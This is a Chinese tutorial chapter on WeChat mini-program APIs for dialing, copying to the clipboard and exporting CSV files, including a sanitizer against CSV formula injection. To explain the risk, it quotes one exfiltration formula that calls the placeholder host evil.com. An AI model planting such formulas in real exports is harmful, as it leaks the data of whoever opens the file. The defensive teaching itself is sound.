# 08 设备能力与文件导出

> 本章涉及的 API：`wx.makePhoneCall`、`wx.setClipboardData`、`wx.getFileSystemManager`、`wx.env.USER_DATA_PATH`、`wx.shareFileMessage`

前七章的 API 都在「数据流」里。这一章的 API 直接摸设备：打电话、写剪贴板、往磁盘写文件、把文件发给微信好友。

本项目用它实现了「拨号 / 复制电话 / 导出 CSV」，三个都是真实业务里高频的需求。

## 8.1 wx.makePhoneCall：拨号

```js
// miniprogram/utils/lead-page.js:128
onCall(e) { wx.makePhoneCall({ phoneNumber: String(e.currentTarget.dataset.phone), fail() {} }); }
```

| 参数 | 说明 |
| --- | --- |
| `phoneNumber` | 要拨的号码，**必须是字符串** |
| `success` | 用户点击「呼叫」后触发 |
| `fail` | 用户取消，或号码非法时触发 |

三个要点：

**第一，必须 `String()` 转一下。** 数据库里电话存的是字符串，但 `dataset` 传过来时如果做过运算可能变成数字。`phoneNumber: 13800000001`（数字）会报错。

**第二，`fail() {}` 不是没写完。** 用户点「取消」也会走 `fail`。空函数是故意吞掉这个正常行为，否则控制台一片红。

**第三，会弹出系统确认框。** `makePhoneCall` 不是直接拨号，而是弹出「呼叫 / 取消」让用户确认，用户点了才真正拨出去。所以不需要额外的权限声明，也不能被用来静默骚扰。

## 8.2 wx.setClipboardData：复制

```js
// miniprogram/utils/lead-page.js:129
onCopy(e) { wx.setClipboardData({ data: String(e.currentTarget.dataset.phone) }); }
```

一行就够。它会**自动弹一个「内容已复制」的 toast**，不需要你再 `showToast` 一次——重复提示反而显得啰嗦。

这也是本项目这里没有 `showToast` 的原因。

`data` 必须是字符串或数字，传对象会报错。

## 8.3 文件导出：三步走

导出 CSV 是本项目最完整的一段设备能力代码：

```js
// miniprogram/utils/lead-page.js:130-145
onExport() {
  if (!this.data.leads.length || this.data.loading || this.data.error) return;
  const content = toCsv(this.data.leads);
  wx.showModal({
    title: '导出已加载线索',
    content: '仅导出已加载的 ' + this.data.leads.length + ' 条结果，包含客户电话和备注，请妥善保管。',
    success: res => {
      if (!res.confirm) return;
      const filePath = wx.env.USER_DATA_PATH + '/sales-leads.csv';
      wx.getFileSystemManager().writeFile({ filePath, data: content, encoding: 'utf8',
        success() {
          if (wx.shareFileMessage) wx.shareFileMessage({ filePath, fileName: 'sales-leads.csv', fail() {} });
          else wx.showToast({ title: '当前微信版本不支持文件分享', icon: 'none' });
        }, fail() { wx.showToast({ title: '导出失败', icon: 'none' }); }
      });
    }
  });
}
```

拆开看三步：**拼内容 → 写文件 → 分享出去**。

### 第一步：wx.env.USER_DATA_PATH

```js
const filePath = wx.env.USER_DATA_PATH + '/sales-leads.csv';
```

`wx.env.USER_DATA_PATH` 是小程序的文件系统根目录，形如 `wxfile://usr`。

**小程序只能往这个目录写文件**，不能随便指定路径。它是沙箱目录，每个小程序独立，卸载后清空。

三种可写目录：

| 目录 | 特点 |
| --- | --- |
| `wx.env.USER_DATA_PATH` | 用户目录，持久保存，**本项目用的就是这个** |
| `wx.env.USER_DATA_PATH + '/temp'` | 临时目录，系统可能清理 |
| 通过 `wx.getFileSystemManager().saveFile` 保存的目录 | 持久化，需先有临时文件 |

### 第二步：writeFile

```js
wx.getFileSystemManager().writeFile({
  filePath,
  data: content,
  encoding: 'utf8',
  success() { /* ... */ },
  fail() { wx.showToast({ title: '导出失败', icon: 'none' }); }
});
```

`encoding` 不写默认是 `utf8`，写出来更明确。如果要写二进制（图片、Excel），就用 `data` 传 `ArrayBuffer` 并省略 `encoding`。

**注意 `writeFile` 是覆盖写**，同名文件会被直接替换。本项目固定用 `sales-leads.csv`，每次导出都覆盖上一次——对「导出当前结果」这个场景是对的，不会积累垃圾文件。

### 第三步：shareFileMessage

```js
if (wx.shareFileMessage) wx.shareFileMessage({ filePath, fileName: 'sales-leads.csv', fail() {} });
else wx.showToast({ title: '当前微信版本不支持文件分享', icon: 'none' });
```

`wx.shareFileMessage` 会唤起微信的「发送给朋友」界面，用户选一个聊天发出去。文件以附件形式出现在对话里，接收方可以下载/打开。

三个约束：

**1. 基础库版本要求。** 低版本没有这个 API，所以必须先判断 `if (wx.shareFileMessage)`。直接调用会报 `is not a function`。

**2. 必须在用户手势的调用链里。** 这是最容易踩的坑。分享属于「敏感操作」，微信要求它由用户主动点击触发。下面这种写法**大概率失败**：

```js
// ❌ 错：脱离了用户手势
setTimeout(() => {
  wx.shareFileMessage({ filePath, fileName: 'a.csv' });
}, 100);
```

本项目把它放在 `showModal` 的 `success` 回调里，是安全的——因为那个回调本身就是用户点击「确定」触发的，仍算用户手势链的一部分。

**3. `fileName` 决定接收方看到的文件名。** 不传的话会用路径里的名字。

## 8.4 CSV 的两个细节

### BOM：让 Excel 正确识别中文

```js
// miniprogram/utils/lead-tools.js:18
return '\uFEFF' + rows.map(row => row.map(csvCell).join(',')).join('\r\n');
```

开头那个 `'\uFEFF'` 是 **UTF-8 BOM**（字节序标记）。

不加会怎样？用 Excel 直接打开 CSV，中文全变乱码——因为 Excel 在 Windows 上默认按 GBK 解码，看到 UTF-8 的字节就懵了。加上 BOM，Excel 就知道「这是 UTF-8」，正常显示中文。

`\r\n` 而不是 `\n`，也是照顾 Excel 的换行习惯。

**这两个细节是「导出 CSV」能不能用的分水岭。** 少了任何一个，用户拿到的就是乱码或一坨连在一起的行。

### CSV 注入防护

```js
// miniprogram/utils/lead-tools.js:7-12
function csvCell(value) {
  let text = String(value == null ? '' : value);
  // Spreadsheet formulas must stay text even after leading whitespace.
  if (/^[\s]*[=+@-]/.test(text) || /^[\t\r\n]/.test(text)) text = "'" + text;
  return '"' + text.replace(/"/g, '""') + '"';
}
```

这段在做两件事：

**1. 转义引号**：`"` 变成 `""`，这是 CSV 规范（字段用双引号包裹，内部的双引号要翻倍）。

**2. 防公式注入**：如果内容以 `=`、`+`、`@`、`-` 开头（允许前面有空白），前面加一个 `'`。

**为什么第 2 点重要？** 因为如果客户备注里写了 `=1+1`，导出成 CSV 后 Excel 会把它当公式执行。更危险的是 `=HYPERLINK("http://evil.com?"&A1)` 这种，能把同一行其他单元格的内容外带出去。这叫做 **CSV Injection / Formula Injection**，是真实存在的攻击手法。

一个客户可以把自己的备注填成公式，然后诱导管理员导出并打开——管理员的表格里就会执行恶意公式。

**这条防护很便宜（一行正则），但很多人不知道要做。** 本项目做了，值得记下来。

## 8.5 为什么导出的是「已加载」而不是「全部」

```js
content: '仅导出已加载的 ' + this.data.leads.length + ' 条结果，包含客户电话和备注，请妥善保管。'
```

提示语写得很清楚：只导出**当前已加载的**，不是全部。

原因有两个：

1. **技术上**：小程序端要拿全量数据得自己分页循环调云函数，几十页请求很容易超时；
2. **产品上**：用户看到的和导出的一致，不会出现「我筛了 20 条，导出却有 500 条」的困惑。

提示语里还有「包含客户电话和备注，请妥善保管」——这是**风险告知**。导出的文件离开小程序后就不再受控，用户可能转发到不该去的地方。提示一句是成本最低的免责方式。

如果业务需要导出全量，正确做法是**在云函数里生成文件并上传到云存储**，返回下载链接给用户，而不是在小程序端拼。

## 8.6 练习

1. **去掉 BOM**：把 `toCsv` 里的 `'\uFEFF'` 删掉，导出一份含中文的 CSV，用 Excel 打开，看乱码。
2. **复现分享失败**：把 `shareFileMessage` 挪到一个 `setTimeout(..., 2000)` 里，看是否能唤起分享。
3. **测 CSV 注入**：把某条线索的备注改成 `=1+1`，导出，用 Excel 打开，确认显示的是文本 `'=1+1` 而不是计算结果 `2`。
4. **加一个导出格式**：增加「导出为 JSON」，复用 `writeFile` + `shareFileMessage`，只改内容生成部分。体会「设备能力代码」和「数据格式化代码」是两层，可以独立替换。
